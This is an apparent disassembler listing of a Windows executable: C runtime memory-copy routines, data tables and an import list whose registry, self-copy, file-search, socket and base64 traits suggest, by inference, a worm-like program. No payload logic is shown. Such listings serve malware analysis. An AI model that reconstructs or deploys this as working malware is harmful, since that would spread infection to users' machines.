		mov	edx, 3
		sub	ecx, 4
		jb	short loc_405174
		and	eax, 3
		add	ecx, eax
		jmp	ds:dword_405180[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405174:				; CODE XREF: A:00405166j
		jmp	ds:TrailUp0_0[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
dword_40517C	dd 0FC8D24FFh		; CODE XREF: A:00405151j
dword_405180	dd 90004051h		; DATA XREF: A:0040516Dr
		dd offset dword_405190
		dd offset LeadUp2_0
		dd offset LeadUp3_0
dword_405190	dd 68AD123h, 468A0788h,	1478801h, 0C102468Ah, 478802E9h
					; DATA XREF: A:00405184o
		dd 3C68302h, 8303C783h,	0CC7208F9h, 24FFA5F3h, 40526895h
		dd 498D00h
LeadUp2_0	dd 68AD123h, 468A0788h,	2E9C101h, 83014788h, 0C78302C6h
					; DATA XREF: A:00405188o
		dd 8F98302h, 0A5F3A672h, 689524FFh, 90004052h
LeadUp3_0	dd 68AD123h, 0C1460788h, 834702E9h, 8C7208F9h, 24FFA5F3h
					; DATA XREF: A:0040518Co
		dd 40526895h, 498D00h, 40525Fh,	40524Ch, 405244h, 40523Ch
		dd 405234h, 40522Ch, 405224h, 40521Ch
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindUp7_0:
		mov	eax, [esi+ecx*4-1Ch]
		mov	[edi+ecx*4-1Ch], eax

UnwindUp6_0:
		mov	eax, [esi+ecx*4-18h]
		mov	[edi+ecx*4-18h], eax

UnwindUp5_0:
		mov	eax, [esi+ecx*4-14h]
		mov	[edi+ecx*4-14h], eax

UnwindUp4_0:
		mov	eax, [esi+ecx*4-10h]
		mov	[edi+ecx*4-10h], eax

UnwindUp3_0:
		mov	eax, [esi+ecx*4-0Ch]
		mov	[edi+ecx*4-0Ch], eax

UnwindUp2_0:
		mov	eax, [esi+ecx*4-8]
		mov	[edi+ecx*4-8], eax

UnwindUp1_0:
		mov	eax, [esi+ecx*4-4]
		mov	[edi+ecx*4-4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax

UnwindUp0_0:
		jmp	ds:off_405268[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
off_405268	dd offset TrailUp0_0	; DATA XREF: A:00405155r
					; A:UnwindUp0_0r
		dd offset TrailUp1_0
		dd offset TrailUp2_0
		dd offset TrailUp3_0
TrailUp0_0	dd 5E08458Bh		; CODE XREF: A:00405155j
					; DATA XREF: A:loc_405174r ...
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		pop	edi
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h
; [0000000B BYTES: COLLAPSED FUNCTION TrailUp1_0. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000011 BYTES: COLLAPSED FUNCTION TrailUp2_0. PRESS	KEYPAD "+" TO EXPAND]
		align 10h
; [00000017 BYTES: COLLAPSED FUNCTION TrailUp3_0. PRESS	KEYPAD "+" TO EXPAND]
		align 4

loc_4052B8:				; CODE XREF: A:0040513Aj
		lea	esi, [ecx+esi-4]
		lea	edi, [ecx+edi-4]
		test	edi, 3
		jnz	short loc_4052EC
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short loc_4052E0
		std
		rep movsd
		cld
		jmp	ds:off_405400[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

loc_4052E0:				; CODE XREF: A:004052D1j A:00405328j ...
		neg	ecx
		jmp	ds:off_4053B0[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

loc_4052EC:				; CODE XREF: A:004052C6j
		mov	eax, edi
		mov	edx, 3
		cmp	ecx, 4
		jb	short near ptr dword_405304
		and	eax, 3
		sub	ecx, eax
		jmp	ds:dword_405308[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_405304	dd 8D24FFh		; CODE XREF: A:004052F6j
dword_405308	dd 90004054h		; DATA XREF: A:004052FDr
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		sbb	[ebx+40h], dl
		add	[eax], bh
		push	ebx
		inc	eax
		add	[eax+53h], ah
		inc	eax
		add	[edx-2EDCFCBAh], cl
		mov	[edi+3], al
		dec	esi
		shr	ecx, 2
		dec	edi
		cmp	ecx, 8
		jb	short loc_4052E0
		std
		rep movsd
		cld
		jmp	ds:off_405400[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

LeadDown2_0:
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		shr	ecx, 2
		mov	[edi+2], al
		sub	esi, 2
		sub	edi, 2
		cmp	ecx, 8
		jb	short loc_4052E0
		std
		rep movsd
		cld
		jmp	ds:off_405400[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

LeadDown3_0:
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		mov	[edi+2], al
		mov	al, [esi+1]
		shr	ecx, 2
		mov	[edi+1], al
		sub	esi, 3
		sub	edi, 3
		cmp	ecx, 8
		jb	loc_4052E0
		std
		rep movsd
		cld
		jmp	ds:off_405400[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
		dd offset UnwindDown7_0
		dd offset UnwindDown6_0
		dd offset UnwindDown5_0
		dd offset UnwindDown4_0
		dd offset UnwindDown3_0
		dd offset UnwindDown2_0
		dd offset UnwindDown1_0
off_4053B0	dd offset UnwindDown0_0	; DATA XREF: A:004052E2r
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindDown7_0:				; DATA XREF: A:00405394o
		mov	eax, [esi+ecx*4+1Ch]
		mov	[edi+ecx*4+1Ch], eax

UnwindDown6_0:				; DATA XREF: A:00405398o
		mov	eax, [esi+ecx*4+18h]
		mov	[edi+ecx*4+18h], eax

UnwindDown5_0:				; DATA XREF: A:0040539Co
		mov	eax, [esi+ecx*4+14h]
		mov	[edi+ecx*4+14h], eax

UnwindDown4_0:				; DATA XREF: A:004053A0o
		mov	eax, [esi+ecx*4+10h]
		mov	[edi+ecx*4+10h], eax

UnwindDown3_0:				; DATA XREF: A:004053A4o
		mov	eax, [esi+ecx*4+0Ch]
		mov	[edi+ecx*4+0Ch], eax

UnwindDown2_0:				; DATA XREF: A:004053A8o
		mov	eax, [esi+ecx*4+8]
		mov	[edi+ecx*4+8], eax

UnwindDown1_0:				; DATA XREF: A:004053ACo
		mov	eax, [esi+ecx*4+4]
		mov	[edi+ecx*4+4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax
; [0000005E BYTES: COLLAPSED FUNCTION UnwindDown0_0. PRESS KEYPAD "+" TO EXPAND]
; [00000224 BYTES: COLLAPSED FUNCTION ___crtLCMapStringA. PRESS	KEYPAD "+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION _strncnt.	PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS KEYPAD "+" TO EXPAND]
		dd 55h dup(0)
		align 10h
		dd 200h	dup(?)
A		ends

; Section 2. (virtual address 00006000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000C00 (   3072.)
; Offset to raw	data for section: 00004C00
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: 16 bytes ?
;
; Imports from ADVAPI32
;
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Externs
; _idata
; LONG __stdcall RegDeleteKeyA(HKEY hKey,LPCSTR	lpSubKey)
		extrn RegDeleteKeyA:dword ; DATA XREF: sub_402770+119r
					; sub_402770+1B3r ...
; LONG __stdcall RegOpenKeyA(HKEY hKey,LPCSTR lpSubKey,PHKEY phkResult)
		extrn RegOpenKeyA:dword	; DATA XREF: sub_402742+Dr
					; sub_402770+A5r
; LONG __stdcall RegDeleteValueA(HKEY hKey,LPCSTR lpValueName)
		extrn RegDeleteValueA:dword ; DATA XREF: sub_402742+1Dr
; LONG __stdcall RegCloseKey(HKEY hKey)
		extrn RegCloseKey:dword	; DATA XREF: sub_402742+26r
					; sub_402770+D4r
; LONG __stdcall RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,const BYTE *lpData,DWORD cbData)
		extrn RegSetValueExA:dword ; DATA XREF:	sub_402770+CBr

;
; Imports from KERNEL32
;
; void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime)
		extrn GetLocalTime:dword ; DATA	XREF: sub_401704+92r
					; sub_402955+19r
; UINT __stdcall _lread(HFILE hFile,LPVOID lpBuffer,UINT uBytes)
		extrn _lread:dword	; DATA XREF: sub_40184F+22r
					; sub_4023E2+8Br ...
; HFILE	__stdcall _lclose(HFILE	hFile)
		extrn _lclose:dword	; DATA XREF: sub_4019FF+650r
					; sub_4023E2+1FCr
; HFILE	__stdcall _lopen(LPCSTR	lpPathName,int iReadWrite)
		extrn _lopen:dword	; DATA XREF: sub_4019FF+627r
					; sub_4023E2+67r
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)
		extrn GetModuleFileNameA:dword ; DATA XREF: sub_4019FF+32Er
					; sub_402770+1Cr ...
; LPSTR	__stdcall lstrcpyA(LPSTR lpString1,LPCSTR lpString2)
		extrn lstrcpyA:dword	; DATA XREF: sub_4019FF+41r
					; sub_4019FF+76r
; int __stdcall	lstrlenA(LPCSTR	lpString)
		extrn lstrlenA:dword	; DATA XREF: sub_4019FF+15r
					; sub_4019FF+1Fr ...
; LONG __stdcall _llseek(HFILE hFile,LONG lOffset,int iOrigin)
		extrn _llseek:dword	; DATA XREF: sub_4023E2+1CDr
; BOOL __stdcall FindClose(HANDLE hFindFile)
		extrn FindClose:dword	; DATA XREF: sub_4025E9+115r
; BOOL __stdcall FindNextFileA(HANDLE hFindFile,LPWIN32_FIND_DATAA lpFindFileData)
		extrn FindNextFileA:dword ; DATA XREF: sub_4025E9+106r
; HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)
		extrn FindFirstFileA:dword ; DATA XREF:	sub_4025E9+3Br
; UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName)
		extrn GetDriveTypeA:dword ; DATA XREF: StartAddress+17r
; BOOL __stdcall SetThreadPriority(HANDLE hThread,int nPriority)
		extrn SetThreadPriority:dword ;	DATA XREF: StartAddress+Ar
					; sub_402955+Fr
; HANDLE GetCurrentThread(void)
		extrn GetCurrentThread:dword ; DATA XREF: StartAddress+3r
					; sub_402955+8r
; BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName,BOOL bFailIfExists)
		extrn CopyFileA:dword	; DATA XREF: sub_402770+7Cr
; UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer,UINT uSize)
		extrn GetWindowsDirectoryA:dword ; DATA	XREF: sub_402770+2Ar
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn Sleep:dword	; DATA XREF: sub_402955+6Cr
					; sub_4029C9+Cr ...
; BOOL __stdcall Beep(DWORD dwFreq,DWORD dwDuration)
		extrn Beep:dword	; DATA XREF: sub_402955+64r
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,DWORD dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID	lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId)
		extrn CreateThread:dword ; DATA	XREF: WinMain(x,x,x,x)+97r
					; WinMain(x,x,x,x)+B1r	...
; DWORD	GetLastError(void)
		extrn GetLastError:dword ; DATA	XREF: WinMain(x,x,x,x)+2Ar
; HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL bInitialOwner,LPCSTR lpName)
		extrn CreateMutexA:dword ; DATA	XREF: WinMain(x,x,x,x)+1Fr
; DWORD	GetTickCount(void)
		extrn GetTickCount:dword ; DATA	XREF: WinMain(x,x,x,x)+8r
; DWORD	__stdcall GetTimeZoneInformation(LPTIME_ZONE_INFORMATION lpTimeZoneInformation)
		extrn GetTimeZoneInformation:dword ; DATA XREF:	sub_401704+A6r
; int __stdcall	LCMapStringA(LCID Locale,DWORD dwMapFlags,LPCSTR lpSrcStr,int cchSrc,LPSTR lpDestStr,int cchDest)
		extrn LCMapStringA:dword ; DATA	XREF: ___crtLCMapStringA+5Er
					; ___crtLCMapStringA+A7r
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; DATA	XREF: ___crtMessageBoxA+12r
; FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)
		extrn GetProcAddress:dword ; DATA XREF:	___crtMessageBoxA+1Er
					; ___crtMessageBoxA+2Ar ...
; UINT GetOEMCP(void)
		extrn GetOEMCP:dword	; DATA XREF: _getSystemCP+1Ar
; UINT GetACP(void)
		extrn GetACP:dword	; DATA XREF: _getSystemCP+2Fr
; BOOL __stdcall GetCPInfo(UINT	CodePage,LPCPINFO lpCPInfo)
		extrn GetCPInfo:dword	; DATA XREF: __setmbcp+48r
					; _setSBUpLow+14r
; BOOL __stdcall GetStringTypeW(DWORD dwInfoType,LPCWSTR lpSrcStr,int cchSrc,LPWORD lpCharType)
		extrn GetStringTypeW:dword ; DATA XREF:	___crtGetStringTypeA+3Fr
					; ___crtGetStringTypeA+12Dr
; BOOL __stdcall GetStringTypeA(LCID Locale,DWORD dwInfoType,LPCSTR lpSrcStr,int cchSrc,LPWORD lpCharType)
		extrn GetStringTypeA:dword ; DATA XREF:	___crtGetStringTypeA+59r
					; ___crtGetStringTypeA+8Dr
; int __stdcall	MultiByteToWideChar(UINT CodePage,DWORD	dwFlags,LPCSTR lpMultiByteStr,int cchMultiByte,LPWSTR lpWideCharStr,int	cchWideChar)
		extrn MultiByteToWideChar:dword	; DATA XREF: ___crtGetStringTypeA+C5r
					; ___crtGetStringTypeA+11Br ...
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem,DWORD dwBytes)
		extrn HeapReAlloc:dword	; DATA XREF: ___sbh_alloc_new_region+28r
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress,DWORD dwSize,DWORD flAllocationType,DWORD flProtect)
		extrn VirtualAlloc:dword ; DATA	XREF: ___sbh_alloc_new_region+76r
					; ___sbh_alloc_new_group+51r
; BOOL __stdcall WriteFile(HANDLE hFile,LPCVOID	lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; DATA XREF: __NMSG_WRITE+14Ar
		extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwindr
; BOOL __stdcall VirtualFree(LPVOID lpAddress,DWORD dwSize,DWORD dwFreeType)
		extrn VirtualFree:dword	; DATA XREF: ___sbh_free_block+23Fr
					; ___sbh_free_block+257r ...
; HANDLE __stdcall HeapCreate(DWORD flOptions,DWORD dwInitialSize,DWORD	dwMaximumSize)
		extrn HeapCreate:dword	; DATA XREF: __heap_init+11r
; BOOL __stdcall HeapDestroy(HANDLE hHeap)
		extrn HeapDestroy:dword	; DATA XREF: __heap_init+2Fr
; BOOL __stdcall FreeEnvironmentStringsA(LPSTR)
		extrn FreeEnvironmentStringsA:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+11Fr
; DWORD	__stdcall GetFileType(HANDLE hFile)
		extrn GetFileType:dword	; DATA XREF: __ioinit+FFr
					; __ioinit+166r
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn GetStdHandle:dword ; DATA	XREF: __ioinit+158r
					; __NMSG_WRITE+143r
; UINT __stdcall SetHandleCount(UINT uNumber)
		extrn SetHandleCount:dword ; DATA XREF:	__ioinit+19Dr
; LPWSTR GetEnvironmentStringsW(void)
		extrn GetEnvironmentStringsW:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+9r
					; ___crtGetEnvironmentStringsA+1Br ...
; HGLOBAL __stdcall GlobalAlloc(UINT uFlags,DWORD dwBytes)
		extrn GlobalAlloc:dword	; DATA XREF: sub_40156C+2Ar
					; sub_40156C+33r ...
; HGLOBAL __stdcall GlobalFree(HGLOBAL hMem)
		extrn GlobalFree:dword	; DATA XREF: sub_40156C+4Ar
					; sub_40156C+FAr ...
; BOOL __stdcall FreeEnvironmentStringsW(LPWSTR)
		extrn FreeEnvironmentStringsW:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+CEr
; int __stdcall	WideCharToMultiByte(UINT CodePage,DWORD	dwFlags,LPCWSTR	lpWideCharStr,int cchWideChar,LPSTR lpMultiByteStr,int cchMultiByte,LPCSTR lpDefaultChar,LPBOOL	lpUsedDefaultChar)
		extrn WideCharToMultiByte:dword
					; DATA XREF: ___crtGetEnvironmentStringsA+7Er
					; ___crtGetEnvironmentStringsA+93r ...
; int __stdcall	LCMapStringW(LCID Locale,DWORD dwMapFlags,LPCWSTR lpSrcStr,int cchSrc,LPWSTR lpDestStr,int cchDest)
		extrn LCMapStringW:dword ; DATA	XREF: ___crtLCMapStringA+42r
					; ___crtLCMapStringA+14Dr ...
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; DATA XREF: start+C2r
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn GetStartupInfoA:dword ; DATA XREF: start+9Fr
					; __ioinit+59r
; LPSTR	GetCommandLineA(void)
		extrn GetCommandLineA:dword ; DATA XREF: start+74r
; DWORD	GetVersion(void)
		extrn GetVersion:dword	; DATA XREF: start+26r
					; Get current version number of	Windows
					; and information about	the operating system platform
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; DATA XREF: _fast_error_exit+1Dr
					; _doexit+91r
; LPVOID __stdcall HeapAlloc(HANDLE hHeap,DWORD	dwFlags,DWORD dwBytes)
		extrn HeapAlloc:dword	; DATA XREF: __heap_alloc+2Er
					; ___sbh_heap_init+Dr ...
; BOOL __stdcall HeapFree(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem)
		extrn HeapFree:dword	; DATA XREF: _free+27r
					; ___sbh_free_block+2C4r ...
; BOOL __stdcall TerminateProcess(HANDLE hProcess,UINT uExitCode)
		extrn TerminateProcess:dword ; DATA XREF: _doexit+17r
; HANDLE GetCurrentProcess(void)
		extrn GetCurrentProcess:dword ;	DATA XREF: _doexit+10r
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
		extrn UnhandledExceptionFilter:dword ; DATA XREF: __XcptFilter+138r
; LPSTR	GetEnvironmentStrings(void)
		extrn GetEnvironmentStrings:dword
					; DATA XREF: ___crtGetEnvironmentStringsA:loc_403C7Er
					; ___crtGetEnvironmentStringsA+E1r

;
; Imports from USER32
;
; DWORD	__stdcall CharLowerBuffA(LPSTR lpsz,DWORD cchLength)
		extrn CharLowerBuffA:dword ; DATA XREF:	sub_4023E2+31r
					; sub_4023E2+CAr ...
; int wsprintfA(LPSTR,LPCSTR,...)
		extrn wsprintfA:dword	; DATA XREF: sub_401704+13Er
					; sub_4019FF+45Br

;
; Imports from WININET
;
		extrn InternetGetConnectedState:dword ;	DATA XREF: sub_4029C9+4r
					; sub_4029C9+22r ...

;
; Imports from WS2_32
;
; int __stdcall	WSAStartup(WORD	wVersionRequested,LPWSADATA lpWSAData)
		extrn WSAStartup:dword	; DATA XREF: WinMain(x,x,x,x)+50r
; int __stdcall	shutdown(SOCKET	s,int how)
		extrn shutdown:dword	; DATA XREF: sub_4019FF+701r
; int __stdcall	recv(SOCKET s,char *buf,int len,int flags)
		extrn recv:dword	; DATA XREF: sub_401938+5Ar
; int __stdcall	send(SOCKET s,const char *buf,int len,int flags)
		extrn send:dword	; DATA XREF: sub_40184F+Br
					; sub_40184F+64r ...
; u_short __stdcall ntohs(u_short netshort)
		extrn ntohs:dword	; DATA XREF: sub_401335+23r
					; sub_401335+35r ...
; char *__stdcall inet_ntoa(struct in_addr in)
		extrn inet_ntoa:dword	; DATA XREF: sub_401335+1E2r
; u_short __stdcall htons(u_short hostshort)
		extrn htons:dword	; DATA XREF: sub_4010A4+37r
					; sub_4010A4:loc_401111r ...
; struct servent *__stdcall getservbyname(const	char *name,const char *proto)
		extrn getservbyname:dword ; DATA XREF: sub_4010A4+5Br
; int __stdcall	connect(SOCKET s,const struct sockaddr *name,int namelen)
		extrn connect:dword	; DATA XREF: sub_4019FF+116r
; struct hostent *__stdcall gethostbyname(const	char *name)
		extrn gethostbyname:dword ; DATA XREF: sub_4010A4+87r
					; sub_4019FF+8Ar
; SOCKET __stdcall socket(int af,int type,int protocol)
		extrn socket:dword	; DATA XREF: sub_4010A4+A0r
					; sub_4019FF+D2r
; int __stdcall	setsockopt(SOCKET s,int	level,int optname,const	char *optval,int optlen)
		extrn setsockopt:dword	; DATA XREF: sub_4010A4+128r
					; sub_4010A4+149r ...
; int __stdcall	sendto(SOCKET s,const char *buf,int len,int flags,const	struct sockaddr	*to,int	tolen)
		extrn sendto:dword	; DATA XREF: sub_4010A4+171r
; int __stdcall	recvfrom(SOCKET	s,char *buf,int	len,int	flags,struct sockaddr *from,int	*fromlen)
		extrn recvfrom:dword	; DATA XREF: sub_4010A4+194r
; int WSAGetLastError(void)
		extrn WSAGetLastError:dword ; DATA XREF: sub_4010A4+19Fr
; int __stdcall	closesocket(SOCKET s)
		extrn closesocket:dword	; DATA XREF: sub_4010A4+1B7r
					; sub_4019FF+70Dr
; unsigned __int32 __stdcall inet_addr(const char *cp)
		extrn inet_addr:dword	; DATA XREF: sub_4010A4+76r

;
; Imports from iphlpapi
;
		extrn __imp_GetNetworkParams:dword ; DATA XREF:	GetNetworkParamsr


; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
B		segment	para public 'CODE' use32
		assume cs:B
		;org 406170h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
byte_406170	db 0			; DATA XREF: sub_402235+35r
		db 1, 2	dup(0)
byte_406174	db 41h			; DATA XREF: sub_401691+Br
					; sub_401691+2Dr ...
aBcdefghijklmno	db 'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'
		db '9+/',0
		align 4
dword_4061B8	dd 0FFFFFFFFh, 4034EBh,	4034FFh, 746E7572h, 20656D69h ;	DATA XREF: start+5o
		dd 6F727265h, 2072h, 534F4C54h,	72652053h, 0D726F72h, 0Ah
		dd 474E4953h, 72726520h, 0A0D726Fh, 0, 414D4F44h, 65204E49h
		dd 726F7272h, 0A0Dh, 32303652h,	2D0A0D38h, 616E7520h, 20656C62h
		dd 69206F74h, 6974696Eh, 7A696C61h, 65682065h, 0A0D7061h
		dd 0, 32303652h, 2D0A0D37h, 746F6E20h, 6F6E6520h, 20686775h
		dd 63617073h, 6F662065h, 6F6C2072h, 206F6977h, 74696E69h
		dd 696C6169h, 6974617Ah, 0A0D6E6Fh, 0, 32303652h, 2D0A0D36h
		dd 746F6E20h, 6F6E6520h, 20686775h, 63617073h, 6F662065h
		dd 74732072h, 206F6964h, 74696E69h, 696C6169h, 6974617Ah
		dd 0A0D6E6Fh, 0, 32303652h, 2D0A0D35h, 72757020h, 69762065h
		dd 61757472h, 7566206Ch, 6974636Eh, 63206E6Fh, 0D6C6C61h
		dd 0Ah,	32303652h, 2D0A0D34h, 746F6E20h, 6F6E6520h, 20686775h
		dd 63617073h, 6F662065h, 6F5F2072h, 6978656Eh, 74612F74h
		dd 74697865h, 62617420h, 0A0D656Ch, 0, 31303652h, 2D0A0D39h
		dd 616E7520h, 20656C62h, 6F206F74h, 206E6570h, 736E6F63h
		dd 20656C6Fh, 69766564h, 0A0D6563h, 0, 31303652h, 2D0A0D38h
		dd 656E7520h, 63657078h, 20646574h, 70616568h, 72726520h
		dd 0A0D726Fh, 0, 31303652h, 2D0A0D37h, 656E7520h, 63657078h
		dd 20646574h, 746C756Dh, 72687469h, 20646165h, 6B636F6Ch
		dd 72726520h, 0A0D726Fh, 0, 31303652h, 2D0A0D36h, 746F6E20h
		dd 6F6E6520h, 20686775h, 63617073h, 6F662065h, 68742072h
		dd 64616572h, 74616420h, 0A0D61h, 62610A0Dh, 6D726F6Eh
		dd 70206C61h, 72676F72h, 74206D61h, 696D7265h, 6974616Eh
		dd 0A0D6E6Fh, 0, 30303652h, 2D0A0D39h, 746F6E20h, 6F6E6520h
		dd 20686775h, 63617073h, 6F662065h, 6E652072h, 6F726976h
		dd 6E656D6Eh, 0A0D74h, 30303652h, 2D0A0D38h, 746F6E20h
		dd 6F6E6520h, 20686775h, 63617073h, 6F662065h, 72612072h
		dd 656D7567h, 0D73746Eh, 0Ah, 30303652h, 2D0A0D32h, 6F6C6620h
		dd 6E697461h, 6F702067h, 20746E69h, 20746F6Eh, 64616F6Ch
		dd 0A0D6465h, 0
aMicrosoftVisua	db 'Microsoft Visual C++ Runtime Library',0 ; DATA XREF: __NMSG_WRITE+119o
		align 4
; char asc_406474[]
asc_406474	db 0Ah			; DATA XREF: __NMSG_WRITE+F1o
		db 0Ah,0
		align 4
; char aRuntimeErrorPr[]
aRuntimeErrorPr	db 'Runtime Error!',0Ah ; DATA XREF: __NMSG_WRITE+D3o
		db 0Ah
		db 'Program: ',0
		align 4
; char a___[]
a___		db '...',0              ; DATA XREF: __NMSG_WRITE+BFo
; char aProgramNameUnk[]
aProgramNameUnk	db '<program name unknown>',0 ; DATA XREF: __NMSG_WRITE+7Do
		align 10h
; const	WCHAR SrcStr
